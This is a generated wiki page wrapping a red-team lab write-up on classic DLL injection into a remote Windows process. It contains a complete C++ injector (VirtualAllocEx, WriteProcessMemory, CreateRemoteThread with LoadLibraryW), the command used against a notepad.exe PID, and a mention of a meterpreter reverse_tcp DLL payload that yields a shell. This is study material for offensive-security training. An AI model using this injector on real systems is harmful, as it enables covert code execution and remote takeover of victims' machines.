---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# DLL Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-injection-process-injection-dll-injection` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/dll-injection.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [DLL Injection](../../topics/offensive-security/dll-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-injection-process-injection-dll-injection |
| name | DLL Injection |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-injection-process-injection/dll-injection.md |

## Preserved Source Material

````yaml
_asset_filenames:
- inject-dll-procmon.png
- inject-dll-shell.png
- inject-dll.png
_body: "---\ndescription: Injecting DLL into a remote process.\n---\n\n# DLL Injection\n\nThis lab attempts a classic DLL\
  \ injection into a remote process.\n\n## Execution\n\n{% code title=\"inject-dll.cpp\" %}\n```cpp\nint main(int argc, char\
  \ *argv[]) {\n\tHANDLE processHandle;\n\tPVOID remoteBuffer;\n\twchar_t dllPath[] = TEXT(\"C:\\\\experiments\\\\evilm64.dll\"\
  );\n\t\n\tprintf(\"Injecting DLL to PID: %i\\n\", atoi(argv[1]));\n\tprocessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE,\
  \ DWORD(atoi(argv[1])));\n\tremoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);\t\
  \n\tWriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);\n\tPTHREAD_START_ROUTINE threatStartRoutineAddress\
  \ = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(\"Kernel32\")), \"LoadLibraryW\");\n\tCreateRemoteThread(processHandle,\
  \ NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);\n\tCloseHandle(processHandle); \n\t\n\treturn 0;\n}\n```\n\
  {% endcode %}\n\nCompiling the above code and executing it with a supplied argument of `4892` which is a PID of the notepad.exe\
  \ process on the victim system:\n\n{% code title=\"attacker@victim\" %}\n```csharp\nPS C:\\experiments\\inject1\\x64\\Debug>\
  \ .\\inject1.exe 4892\nInjecting DLL to PID: 4892\n```\n{% endcode %}\n\nAfter the DLL is successfully injected, the attacker\
  \ receives a meterpreter session from the injected process and its privileges:\n\n![](../../.gitbook/assets/inject-dll-shell.png)\n\
  \n{% file src=\"../../.gitbook/assets/inject1.exe\" caption=\"DLL injector.exe\" %}\n\n{% file src=\"../../.gitbook/assets/evilm64.dll\"\
  \ caption=\"c:\\\\experiments\\\\evilm64.dll \\(windows/x64/meterpreter/reverse\\_tcp\\)\" %}\n\n## Observations\n\nNote\
  \ how the notepad spawned rundll32 which then spawned a cmd.exe because of the meterpreter payload \\(and attacker's `shell`\
  \ command\\) that got executed as part of the injected evilm64.dll into the notepad process:\n\n![](../../.gitbook/assets/inject-dll.png)\n\
  \n![](../../.gitbook/assets/inject-dll-procmon.png)\n\n## References\n\n{% embed url=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ms683212\\\
  (v=vs.85\\).aspx\" %}\n\n{% embed url=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ms684175\\(v=vs.85\\).aspx\"\
  \ %}"
_relative_path: offensive-security/code-injection-process-injection/dll-injection.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/dll-injection.md
````
